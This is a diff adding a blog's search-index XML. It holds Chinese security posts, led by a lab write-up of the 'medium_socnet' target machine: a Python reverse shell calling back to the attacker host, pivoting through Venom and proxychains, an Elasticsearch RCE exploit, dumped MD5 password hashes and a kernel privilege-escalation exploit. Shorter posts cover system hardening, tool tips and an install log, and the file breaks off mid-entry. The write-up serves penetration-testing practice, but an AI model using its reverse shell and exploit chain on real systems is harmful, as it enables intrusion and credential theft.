@@ -1,0 +1,191 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>medium_socnet</title>
+    <link href="/2022/11/26/medium_socnet/"/>
+    <url>/2022/11/26/medium_socnet/</url>
+    
+    <content type="html"><![CDATA[<h1 id="打靶学习"><a href="#打靶学习" class="headerlink" title="打靶学习"></a>打靶学习</h1><p><strong>刻意练习打靶，在头脑中形成可复用的渗透测试经验，以此提高技能水平</strong></p><h2 id="2层网络发现靶机ip"><a href="#2层网络发现靶机ip" class="headerlink" title="2层网络发现靶机ip"></a>2层网络发现靶机ip</h2><p><strong>靶机(192.168.5.128)</strong><br><strong>kali(192.168.5.129)</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo arp-scan -l</span><br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669465366253.png"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sT -p- <span class="hljs-number">192.168.5.128</span><br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669472015902.png"></p><h2 id="服务版本探测"><a href="#服务版本探测" class="headerlink" title="服务版本探测"></a>服务版本探测</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -p22,<span class="hljs-number">5000</span> -sV <span class="hljs-number">192.168.5.128</span><br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669472552324.png"></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>dirsearch</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">5.128</span>:<span class="hljs-number">5000</span>/admin<br></code></pre></td></tr></table></figure><h2 id="后台反弹shell"><a href="#后台反弹shell" class="headerlink" title="后台反弹shell"></a>后台反弹shell</h2><p>python反弹shell</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import <span class="hljs-built_in">socket</span>,os,subprocess<br>RHOST=<span class="hljs-string">&#x27;192.168.5.129&#x27;</span>  <span class="hljs-comment"># Change it</span><br>RPORT=<span class="hljs-number">4444</span>  <span class="hljs-comment"># Change it</span><br>s=<span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM)  <span class="hljs-comment"># 创建一个TCP-socket对象</span><br>s.connect((RHOST,RPORT)) <br>os.dup2(s.fileno(),<span class="hljs-number">0</span>)<br>os.dup2(s.fileno(),<span class="hljs-number">1</span>)<br>os.dup2(s.fileno(),<span class="hljs-number">2</span>)<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])  <br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669465599182.png"></p><h2 id="确定docker容器"><a href="#确定docker容器" class="headerlink" title="确定docker容器"></a>确定docker容器</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>  /.dockerenv<br><span class="hljs-built_in">cat</span> /proc/1/cgroup//出现docker字样<br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669465678213.png"><br><img src="https://zhangdeanquan.github.io/post-images/1669465686016.png"></p><h2 id="内网主机ping探活"><a href="#内网主机ping探活" class="headerlink" title="内网主机ping探活"></a>内网主机ping探活</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq <span class="hljs-number">1</span> <span class="hljs-number">254</span>);<span class="hljs-keyword">do</span> ping -c <span class="hljs-number">1</span> <span class="hljs-number">172.17</span>.<span class="hljs-number">0</span>.<span class="hljs-variable">$i</span>;done<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/datanese/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">53227292</span><br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669465763498.png"></p><p><strong>从第4台就没有机子存活了</strong><br><img src="https://zhangdeanquan.github.io/post-images/1669465809279.png"></p><h2 id="内网隧道搭建"><a href="#内网隧道搭建" class="headerlink" title="内网隧道搭建"></a>内网隧道搭建</h2><p><strong>本次使用venom搭建隧道，都快2023了，工具完全可以换个更便捷的</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Dliv3/</span>Venom/<br></code></pre></td></tr></table></figure><h3 id="python3开启http服务并赋予执行权限"><a href="#python3开启http服务并赋予执行权限" class="headerlink" title="python3开启http服务并赋予执行权限"></a>python3开启http服务并赋予执行权限</h3><p><img src="https://zhangdeanquan.github.io/post-images/1669466590545.png"><br><img src="https://zhangdeanquan.github.io/post-images/1669466603990.png"></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">admin</span>监听端口，<span class="hljs-built_in">agent</span>发起连接:<br><span class="hljs-built_in">admin</span>.exe -lport <span class="hljs-number">9999</span><br><span class="hljs-built_in">agent</span>.exe -rhost <span class="hljs-number">192.168</span>.<span class="hljs-number">0.103</span> -rport <span class="hljs-number">9999</span><br><span class="hljs-built_in">agent</span>监听端口，<span class="hljs-built_in">admin</span>发起连接:<br><span class="hljs-built_in">agent</span>.exe -lport <span class="hljs-number">8888</span><br><span class="hljs-built_in">admin</span>.exe -rhost <span class="hljs-number">192.168</span>.<span class="hljs-number">204.139</span> -rport <span class="hljs-number">8888</span><br>————————————————<br>版权声明：本文为CSDN博主「猫星人不会笑」的原创文章，遵循CC <span class="hljs-number">4.0</span> BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：https:<span class="hljs-comment">//blog.csdn.net/u011215939/article/details/103403545</span><br><span class="hljs-comment">//根据实战环境更换</span><br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669467910714.png"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">靶机：<span class="hljs-number">192.168.5.128</span><br>kali: <span class="hljs-number">192.168.5.129</span><br></code></pre></td></tr></table></figure><h3 id="kali本机开启socks服务"><a href="#kali本机开启socks服务" class="headerlink" title="kali本机开启socks服务"></a>kali本机开启socks服务</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">show<span class="hljs-regexp">//</span>查看帮助选项<br>goto <span class="hljs-number">1</span><span class="hljs-regexp">//</span>进入<span class="hljs-number">1</span>节点<br>socks <span class="hljs-number">1080</span><span class="hljs-regexp">//</span>开启socks服务并绑定<span class="hljs-number">1080</span>端口<br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669468766059.png"></p><h3 id="配置proxychains"><a href="#配置proxychains" class="headerlink" title="配置proxychains"></a>配置proxychains</h3><p>配置proxychains访问内网并探测内网主机/服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> nmap -Pn -sT <span class="hljs-number">172.17.0.1</span> //<span class="hljs-number">22</span>,<span class="hljs-number">5000</span><br><span class="hljs-attribute">proxychains</span> nmap -Pn -sT <span class="hljs-number">172.17.0.3</span> //<span class="hljs-number">9200</span><br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669469296089.png"></p><h3 id="内网主机、版本服务发现"><a href="#内网主机、版本服务发现" class="headerlink" title="内网主机、版本服务发现"></a>内网主机、版本服务发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> nmap -Pn -sT -sV  <span class="hljs-number">172.17.0.1</span>-<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669471758544.png"></p><h2 id="Searchsploit搜索"><a href="#Searchsploit搜索" class="headerlink" title="Searchsploit搜索"></a>Searchsploit搜索</h2><p>searchsploit Elasticsearch</p><p><strong>远程rce获取root权限</strong></p><p>获取password  hash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">searchsploit Elasticsearch<br>locate linux<span class="hljs-regexp">/remote/</span><span class="hljs-number">36337</span>.py<br>cp <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/linux/</span>remote/<span class="hljs-number">36337</span>.py .<br>proxychains python <span class="hljs-number">36337</span>.py <span class="hljs-number">172.17</span>.<span class="hljs-number">0.3</span>  <br></code></pre></td></tr></table></figure><h3 id="sudo权限检查"><a href="#sudo权限检查" class="headerlink" title="sudo权限检查"></a>sudo权限检查</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -s<span class="hljs-regexp">//</span>查看是否具有sudo权限<br></code></pre></td></tr></table></figure><h3 id="查看权限，当前目录下发现密码本"><a href="#查看权限，当前目录下发现密码本" class="headerlink" title="查看权限，当前目录下发现密码本"></a>查看权限，当前目录下发现密码本</h3><p><img src="https://zhangdeanquan.github.io/post-images/1669470480453.png"><br><img src="https://zhangdeanquan.github.io/post-images/1669470539669.png"></p><h3 id="对收集的密码逐一解密"><a href="#对收集的密码逐一解密" class="headerlink" title="对收集的密码逐一解密"></a>对收集的密码逐一解密</h3><p><a href="https://www.somd5.com/">https://www.somd5.com/</a><br><img src="https://zhangdeanquan.github.io/post-images/1669471825203.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">john:<span class="hljs-number">3</span>f8184a7343664553fcb5337a3138814 <span class="hljs-regexp">//</span><span class="hljs-number">1337</span>hack<br>test:<span class="hljs-number">861</span>f194e9d6118f3d942a72be3e51749<span class="hljs-regexp">//</span>somd5没解<br>admin:<span class="hljs-number">670</span>c3bbc209a18dde5446e5e6c1f1d5b<span class="hljs-regexp">//</span>somd5没解<br>root:b3d34352fc26117979deabdf1b9b6354<span class="hljs-regexp">//</span>somd5没解<br>jane:<span class="hljs-number">5</span>c158b60ed97c723b673529b8a3cf72b<span class="hljs-regexp">//</span>somd5没解<br></code></pre></td></tr></table></figure><h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><p>登陆本地用户john进行提权</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">searchsploit linux <span class="hljs-number">3.13</span><br>cp <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/linux/</span>local/<span class="hljs-number">37292</span>.c .<br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1669471891135.png"></p><p><strong>目标机器无gcc，本地相同系统编译执行</strong><br><img src="https://zhangdeanquan.github.io/post-images/1669472162181.png"></p><h3 id="修改gcc代码，并编译"><a href="#修改gcc代码，并编译" class="headerlink" title="修改gcc代码，并编译"></a>修改gcc代码，并编译</h3><p>删除<br><img src="https://zhangdeanquan.github.io/post-images/1669472197836.png"><br><strong>由于修改了gcc代码，这里还要同时上传ofs-lib.so文件</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp -p <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>data<span class="hljs-regexp">/exploits/</span>CVE-<span class="hljs-number">2015</span>-<span class="hljs-number">1328</span>/ofs-lib.so .<br></code></pre></td></tr></table></figure><p><strong>通过python开启http，目标机下载执行</strong></p><p><img src="https://zhangdeanquan.github.io/post-images/1669472272809.png"></p><h3 id="成功拿到root权限"><a href="#成功拿到root权限" class="headerlink" title="成功拿到root权限"></a>成功拿到root权限</h3><p><img src="https://zhangdeanquan.github.io/post-images/1669472312987.png"></p><h3 id="确定该环境是docker搭建"><a href="#确定该环境是docker搭建" class="headerlink" title="确定该环境是docker搭建"></a>确定该环境是docker搭建</h3><p><img src="https://zhangdeanquan.github.io/post-images/1669472335107.png"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>打靶记录</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Windows安全加固-修改默认远程连接端口</title>
+    <link href="/2022/07/09/%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3/"/>
+    <url>/2022/07/09/%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3/</url>
+    
+    <content type="html"><![CDATA[<p>适用场景：Windows主机使用默认远程端口进行连接</p><p>修改默认端口，防止爆破。</p><p><strong>注册表路径</strong></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp<br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1665309248322.jpg"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">HKEY_LOCAL_MACHINE<span class="hljs-regexp">/System/</span>CurrentControlSet<span class="hljs-regexp">/Control/</span>Terminal Server<span class="hljs-regexp">/WinStations/</span>RDP-Tcp<br></code></pre></td></tr></table></figure><p><img src="https://zhangdeanquan.github.io/post-images/1665309257704.jpg"></p><p><strong>重启服务</strong></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> stop termservice    //管理员权限运行<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> termservice       <br></code></pre></td></tr></table></figure><p><strong>远程连接时带上端口号即可：</strong></p><p><img src="https://zhangdeanquan.github.io/post-images/1665309270607.jpg"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>安全加固</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Linux安全加固-禁ping</title>
+    <link href="/2022/06/26/NoICMP/"/>
+    <url>/2022/06/26/NoICMP/</url>
+    
+    <content type="html"><![CDATA[<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">1</span> &gt;<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/icmp_echo_ignore_all<br></code></pre></td></tr></table></figure><p><strong>不响应ICMP请求</strong></p><p><img src="https://zhangdeanquan.github.io/post-images/1664202310410.jpg"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>安全加固</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>ip匿名自测</title>
+    <link href="/2022/05/05/%E5%8C%BF%E5%90%8D%E8%87%AA%E6%B5%8B/"/>
+    <url>/2022/05/05/%E5%8C%BF%E5%90%8D%E8%87%AA%E6%B5%8B/</url>
+    
+    <content type="html"><![CDATA[<p>黑客街<br><a href="https://www.hackjie.com/tracking">https://www.hackjie.com/tracking</a></p><p><img src="https://zhangdeanquan.github.io/post-images/1663837471100.jpg"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>介绍2个安全搜索网站</title>
+    <link href="/2022/02/02/%E5%AE%89%E5%85%A8%E7%BD%91%E7%AB%99/"/>
+    <url>/2022/02/02/%E5%AE%89%E5%85%A8%E7%BD%91%E7%AB%99/</url>
+    
+    <content type="html"><![CDATA[<p><strong>1、风炫安全</strong><br>对全网文章进行采集，输入关键词即可搜索<br><a href="https://www.evalshell.com/">https://www.evalshell.com/</a></p><p><img src="https://zhangdeanquan.github.io/post-images/1663675768635.jpg"></p><p><strong>2、红客</strong><br>匿名搜索（自测）<br><a href="https://www.hong.ke/">https://www.hong.ke/</a></p><p><img src="https://zhangdeanquan.github.io/post-images/1663675773889.jpg"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>代理本地msf进入内网</title>
+    <link href="/2021/07/15/msf%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91/"/>
+    <url>/2021/07/15/msf%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91/</url>
+    
+    <content type="html"><![CDATA[<p>使用kali自带的proxychains</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br><br></code></pre></td></tr></table></figure><p>或者在set payload后，设置msf代理</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> proxies <span class="hljs-comment">socks5:192.168.0.1:1080</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>linux 查看命令执行成功与否</title>
+    <link href="/2021/02/04/linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%83%85%E5%86%B5/"/>
+    <url>/2021/02/04/linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%83%85%E5%86%B5/</url>
+    
+    <content type="html"><![CDATA[<p>安装软件，起服务不知道执行情况？</p><p>echo $?<br>返回0则表示执行成功</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(root💀kali)</span>-[~]<br>└─<span class="hljs-comment"># apt install tree</span><br>正在读取软件包列表<span class="hljs-string">...</span> 完成<br>正在分析软件包的依赖关系树<span class="hljs-string">...</span> 完成<br>正在读取状态信息<span class="hljs-string">...</span> 完成                 <br>将会同时安装下列软件：<br>  libc-bin libc-dev-bin libc-l10n libc6 libc6-dev libc6-i386<br>  locales rpcsvc-proto<br>建议安装：<br>  glibc-doc libnss-nis libnss-nisplus manpages-dev<br>推荐安装：<br>  manpages-dev libc-devtools<br>下列【新】软件包将被安装：<br>  rpcsvc-proto tree<br>下列软件包将被升级：<br>  libc-bin libc-dev-bin libc-l10n libc6 libc6-dev libc6-i386<br>  locales<br>升级了 7 个软件包，新安装了 2 个软件包，要卸载 0 个软件包，有 1676 个软件包未被升级。<br>需要下载 13.5 MB 的归档。<br>解压缩后将会空出 4,438 kB 的空间。<br>您希望继续执行吗？ [Y/n] Y<br>获取<span class="hljs-function">:1</span> http:<span class="hljs-string">//kali.download/kali</span> kali-rolling/main amd64 libc-l10n all 2.34-4 [876 kB]<br>获取<span class="hljs-function">:2</span> http:<span class="hljs-string">//kali.download/kali</span> kali-rolling/main amd64 libc-dev-bin amd64 2.34-4 [246 kB]<br>获取<span class="hljs-function">:3</span> http:<span class="hljs-string">//kali.download/kali</span> kali-rolling/main amd64 libc6-dev amd64 2.34-4 [1,894 kB]<br>获取<span class="hljs-function">:4</span> http:<span class="hljs-string">//kali.download/kali</span> kali-rolling/main amd64 rpcsvc-proto amd64 1.4.2-4 [63.1 kB]                   <br>获取<span class="hljs-function">:5</span> http:<span class="hljs-string">//kali.download/kali</span> kali-rolling/main amd64 libc6-i386 amd64 2.34-4 [2,639 kB]                     <br>获取<span class="hljs-function">:6</span> http:<span class="hljs-string">//kali.download/kali</span> kali-rolling/main amd64 locales all 2.34-4 [4,091 kB]                          <br>获取<span class="hljs-function">:7</span> http:<span class="hljs-string">//kali.download/kali</span> kali-rolling/main amd64 libc6 amd64 2.34-4 [2,765 kB]                          <br>获取<span class="hljs-function">:8</span> http:<span class="hljs-string">//kali.download/kali</span> kali-rolling/main amd64 libc-bin amd64 2.34-4 [897 kB]                         <br>获取<span class="hljs-function">:9</span> http:<span class="hljs-string">//kali.download/kali</span> kali-rolling/main amd64 tree amd64 2.0.3-1 [56.4 kB]                           <br>已下载 13.5 MB，耗时 23秒 <span class="hljs-params">(579 kB/s)</span>                                                                            <br>正在预设定软件包 <span class="hljs-string">...</span><br><span class="hljs-params">(正在读取数据库 ... 系统当前共安装有 267124 个文件和目录。)</span><br>准备解压 <span class="hljs-string">.../0-libc-l10n_2.34-4_all.deb</span>  <span class="hljs-string">...</span><br>正在解压 libc-l10n <span class="hljs-params">(2.34-4)</span> 并覆盖 <span class="hljs-params">(2.31-9)</span> <span class="hljs-string">...</span><br>准备解压 <span class="hljs-string">.../1-libc-dev-bin_2.34-4_amd64.deb</span>  <span class="hljs-string">...</span><br>正在解压 libc-dev-bin <span class="hljs-params">(2.34-4)</span> 并覆盖 <span class="hljs-params">(2.31-9)</span> <span class="hljs-string">...</span><br>准备解压 <span class="hljs-string">.../2-libc6-dev_2.34-4_amd64.deb</span>  <span class="hljs-string">...</span><br>正在解压 libc6-dev<span class="hljs-function">:amd64</span> <span class="hljs-params">(2.34-4)</span> 并覆盖 <span class="hljs-params">(2.31-9)</span> <span class="hljs-string">...</span><br>正在替换原软件包中的文件 libc6<span class="hljs-function">:amd64</span> <span class="hljs-params">(2.31-9)</span> <span class="hljs-string">...</span><br>正在选中未选择的软件包 rpcsvc-proto。<br>准备解压 <span class="hljs-string">.../3-rpcsvc-proto_1.4.2-4_amd64.deb</span>  <span class="hljs-string">...</span><br>正在解压 rpcsvc-proto <span class="hljs-params">(1.4.2-4)</span> <span class="hljs-string">...</span><br>准备解压 <span class="hljs-string">.../4-libc6-i386_2.34-4_amd64.deb</span>  <span class="hljs-string">...</span><br>正在解压 libc6-i386 <span class="hljs-params">(2.34-4)</span> 并覆盖 <span class="hljs-params">(2.31-9)</span> <span class="hljs-string">...</span><br>准备解压 <span class="hljs-string">.../5-locales_2.34-4_all.deb</span>  <span class="hljs-string">...</span><br>正在解压 locales <span class="hljs-params">(2.34-4)</span> 并覆盖 <span class="hljs-params">(2.31-9)</span> <span class="hljs-string">...</span><br>准备解压 <span class="hljs-string">.../6-libc6_2.34-4_amd64.deb</span>  <span class="hljs-string">...</span><br>Checking for services that may need to be restarted.<span class="hljs-string">..</span><br>Checking init scripts.<span class="hljs-string">..</span><br>正在解压 libc6<span class="hljs-function">:amd64</span> <span class="hljs-params">(2.34-4)</span> 并覆盖 <span class="hljs-params">(2.31-9)</span> <span class="hljs-string">...</span><br>正在设置 libc6<span class="hljs-function">:amd64</span> <span class="hljs-params">(2.34-4)</span> <span class="hljs-string">...</span><br>Checking for services that may need to be restarted.<span class="hljs-string">..</span><br>Checking init scripts.<span class="hljs-string">..</span><br><br>Restarting services possibly affected by the upgrade:<br>  cron: restarting.<span class="hljs-string">..done.</span><br><br>Services restarted successfully.<br><span class="hljs-params">(正在读取数据库 ... 系统当前共安装有 267098 个文件和目录。)</span><br>准备解压 <span class="hljs-string">.../libc-bin_2.34-4_amd64.deb</span>  <span class="hljs-string">...</span><br>正在解压 libc-bin <span class="hljs-params">(2.34-4)</span> 并覆盖 <span class="hljs-params">(2.31-9)</span> <span class="hljs-string">...</span><br>正在设置 libc-bin <span class="hljs-params">(2.34-4)</span> <span class="hljs-string">...</span><br>正在选中未选择的软件包 tree。<br><span class="hljs-params">(正在读取数据库 ... 系统当前共安装有 267098 个文件和目录。)</span><br>准备解压 <span class="hljs-string">.../tree_2.0.3-1_amd64.deb</span>  <span class="hljs-string">...</span><br>正在解压 tree <span class="hljs-params">(2.0.3-1)</span> <span class="hljs-string">...</span><br>正在设置 libc-l10n <span class="hljs-params">(2.34-4)</span> <span class="hljs-string">...</span><br>正在设置 locales <span class="hljs-params">(2.34-4)</span> <span class="hljs-string">...</span><br>正在安装新版本配置文件 <span class="hljs-string">/etc/locale.alias</span> <span class="hljs-string">...</span><br>Generating locales <span class="hljs-params">(this might take a while)</span><span class="hljs-string">...</span><br>  zh_CN.UTF-8.<span class="hljs-string">..</span> done<br>Generation complete.<br>正在设置 rpcsvc-proto <span class="hljs-params">(1.4.2-4)</span> <span class="hljs-string">...</span><br>正在设置 tree <span class="hljs-params">(2.0.3-1)</span> <span class="hljs-string">...</span><br>正在设置 libc6-i386 <span class="hljs-params">(2.34-4)</span> <span class="hljs-string">...</span><br>正在设置 libc-dev-bin <span class="hljs-params">(2.34-4)</span> <span class="hljs-string">...</span><br>正在设置 libc6-dev<span class="hljs-function">:amd64</span> <span class="hljs-params">(2.34-4)</span> <span class="hljs-string">...</span><br>正在处理用于 man-db <span class="hljs-params">(2.9.3-2)</span> 的触发器 <span class="hljs-string">...</span><br>正在处理用于 kali-menu <span class="hljs-params">(2021.1.4)</span> 的触发器 <span class="hljs-string">...</span><br>正在处理用于 libc-bin <span class="hljs-params">(2.34-4)</span> 的触发器 <span class="hljs-string">...</span><br>                                                                                                                 <br>┌──<span class="hljs-params">(root💀kali)</span>-[~]<br>└─<span class="hljs-comment"># echo $?</span><br>0<br>                                                                                                                 <br>┌──<span class="hljs-params">(root💀kali)</span>-[~]<br>└─<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>linux</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>kali下proxychains使用sock5</title>
+    <link href="/2020/09/09/kali%E8%AE%BE%E7%BD%AEproxychains/"/>
+    <url>/2020/09/09/kali%E8%AE%BE%E7%BD%AEproxychains/</url>
+    
